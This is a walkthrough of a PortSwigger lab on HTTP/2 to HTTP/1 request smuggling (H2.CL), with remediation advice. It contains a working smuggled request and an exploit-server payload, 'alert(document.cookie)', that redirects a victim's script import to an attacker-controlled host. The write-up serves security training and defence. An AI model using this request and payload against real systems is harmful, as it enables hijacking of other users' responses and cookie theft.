# Lab 14: H2.CL request smuggling

**Category:** HTTP Request Smuggling
**Difficulty:** Expert
**Lab link:** [H2.CL request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

## Overview

Mirror of Lab 13 (H2.TE) with `Content-Length` instead of `Transfer-Encoding` as the preserved-across-downgrade length header. Attacker sends an HTTP/2 request with `Content-Length: 0` but a non-empty body. Front-end honors frame length; back-end honors the preserved CL=0 and treats the body as the start of the next request. Smuggle a `GET /resources` with `Host: exploit-server`; the back-end's redirect response gets routed to the victim's next script-fetch, pulling `alert(document.cookie)` from the attacker's domain.

## Key Concepts

- **H2.CL:** attacker-provided `Content-Length` survives HTTP/2 → HTTP/1 downgrade. HTTP/2 doesn't use CL for framing, so the front-end doesn't normalize it before forwarding.
- **Non-empty body with `CL: 0`** is impossible in HTTP/1 but legal in HTTP/2 (framing lives at the protocol layer). Downgrading preserves the mismatch.
- **Victim script-import timing:** the smuggled redirect only delivers XSS when the victim's browser is importing a `<script>` at the moment the response lands. Multiple sends increase the window.
- **Same victim-redirect pattern as Lab 11** (web cache poisoning), delivered through HTTP/2 downgrade instead of CL.TE cache binding.

## Burp Setup

- Repeater → Inspector → Request Attributes → **HTTP/2**.
- Repeater menu → uncheck **Update Content-Length**.
- Confirm `Content-Length: 0` is **manually set** and not auto-corrected.

## Prerequisite: Exploit server

- File: `/resources`
- Content-Type: `text/javascript`
- Body: `alert(document.cookie)`
- Store.

The lab's redirect sends victims to `/resources/` with a trailing slash. The file at `/resources` serves the response for `/resources/` on the exploit server.

## Solution

Send multiple times (5-10) with brief gaps:

```
POST / HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: EXPLOIT-ID.exploit-server.net
Content-Length: 5

x=1
```

Wait ~10s after a round of sends. Check exploit server **Access log** for `GET /resources/` entries. If the victim followed the redirect, alert fires in their browser → lab solved.

## How the Desync Works

**Attacker's HTTP/2 request:**
- `Content-Length: 0` header.
- Non-empty body (`GET /resources HTTP/1.1\r\nHost: EXPLOIT-ID...\r\nContent-Length: 5\r\n\r\nx=1`) — legal in HTTP/2 because framing is independent.

**Front-end (HTTP/2):**
- Parses body via HTTP/2 frames. Full body forwarded.
- Downgrades to HTTP/1 with `Content-Length: 0` preserved in the headers.

**Back-end (HTTP/1):**
- Sees `Content-Length: 0`. Reads zero body bytes for the outer POST.
- Treats the forwarded body as the next HTTP/1 request: `GET /resources HTTP/1.1\r\nHost: EXPLOIT-ID.exploit-server.net\r\nContent-Length: 5\r\n\r\nx=1`.
- Processes the smuggled GET.
- `/resources` builds a redirect using the request Host → `Location: https://EXPLOIT-ID.exploit-server.net/resources/`.

**Front-end pairing:**
- Front-end has a pending request from the victim's browser (loading a script from the lab origin).
- Back-end's redirect response gets paired with that pending request.
- Victim's browser receives the redirect → follows to `https://EXPLOIT-ID.exploit-server.net/resources/` → loads `alert(document.cookie)` as JavaScript → executes.

## Why Non-Empty Body With CL=0 Is Legal in HTTP/2

HTTP/2 framing is independent of HTTP/1's length semantics. A client can send any number of DATA frames regardless of whether a `content-length` pseudo-header or header is present. HTTP/2 implementations should either:
- Strip the attacker-provided `Content-Length` before downgrading, OR
- Reject the request outright per RFC 9113 §8.1.1 when CL disagrees with observed frame length.

Vulnerable stacks do neither.

## Why `/resources` Is a Good Target

Any endpoint that builds a redirect `Location` from the Host header is a candidate. `/resources` → `/resources/` is a trailing-slash normalization redirect, extremely common in production. The victim's browser imports lots of scripts/CSS on page load; any one of them racing against the smuggle is a candidate for the redirect takeover.

## Why Timing Matters

The smuggled redirect pairs with **whatever** request the victim's browser sends next on this back-end connection. Only a `<script>` import triggers JS execution — a CSS fetch, image fetch, or XHR won't fire `alert`. Timing the smuggle so a script import is pending is the trial-and-error part.

## Why It Worked

- Front-end accepted HTTP/2 with `Content-Length: 0` + non-empty body (frame length wins at the front-end).
- Front-end preserved the attacker's CL header when downgrading to HTTP/1.
- Back-end honored CL=0, treated the body as the next request.
- Any endpoint with Host-reflected redirect behaviour becomes a victim-redirect primitive.

## Remediation

- **Strip or normalize `Content-Length` and `Transfer-Encoding` when downgrading HTTP/2 → HTTP/1.** HTTP/2 doesn't use these headers for framing; preserving them is always wrong.
- **Reject HTTP/2 requests where CL disagrees with frame length** (RFC 9113 §8.1.1 requires this).
- **Use HTTP/2 end-to-end** so no downgrade step exists.
- **Validate redirect `Location` targets** against an allow-list before serving.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-14-h2cl-request-smuggling/solve.py)

Documentation-first — HTTP/2 with deliberately-mismatched CL requires low-level framing control. Manual Burp steps are the clean path.

## Key Takeaways

- **H2.CL + H2.TE together** cover the HTTP/2 downgrade bug class. Front-end strips neither, back-end honors both — any one creates a desync.
- **`Content-Length: 0` with a non-empty body is impossible in HTTP/1** but legal in HTTP/2. Downgrade without normalization preserves the mismatch.
- **Victim-redirect primitives** generalize to any Host-reflected `Location`-building endpoint — trailing-slash normalization, protocol upgrade, canonicalization, etc.
- **Script-import timing** is the exploit's hardest part — multiple sends increase the probability of landing in a script fetch's window.
- **The fix lives at the HTTP/2 → HTTP/1 translator.** Edge proxies MUST strip or validate attacker-provided length headers during downgrade.
